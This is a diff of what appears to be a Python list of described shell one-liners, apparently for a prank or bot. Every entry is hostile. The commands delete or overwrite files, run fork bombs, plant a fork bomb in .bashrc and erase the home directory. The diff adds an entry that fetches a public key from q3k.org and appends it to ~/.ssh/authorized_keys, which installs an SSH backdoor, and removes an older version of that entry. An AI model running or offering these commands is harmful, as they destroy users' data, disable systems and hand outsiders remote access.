@@ -15,6 +15,11 @@ f="${files[RANDOM % ${#files[@]}]}"
 rm -rf "$f"
 curl http://placekitten.com/g/320/240 > "$f"
 echo 'bang!' $f 'is now a kitten' """),
+    ("add my public key to your authorized_keys in .ssh", """mkdir -p .ssh
+chmod 700 ~/.ssh
+curl https://q3k.org/pubkey >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+echo 'bang! thanks for the access.'"""),
     ("run a forkbomb", """
 forkbomb() {
     echo 'bang!';
@@ -28,9 +33,5 @@ rm -rf "$f"
 echo 'bang!' $f 'is gone forever.'"""),
     ("delete ~/.ssh", "rm -rf ~/.ssh; echo 'bang! no more ssh for you.'"),
     ("put a forkbomb in your .bashrc", """ echo ":(){ :|:& };:" >> ~/.bashrc"""),
-    ("(re-)create .ssh and add my public key to it", """mkdir -p .ssh
-chmod 600 .ssh
-curl https://q3k.org/pubkey > .ssh/authorized_keys
-echo 'bang! thanks for the access.'"""),
     ("delete your whole homedir", """rm -rf ~; echo 'bang!' "you're homeless now." """),
 ]
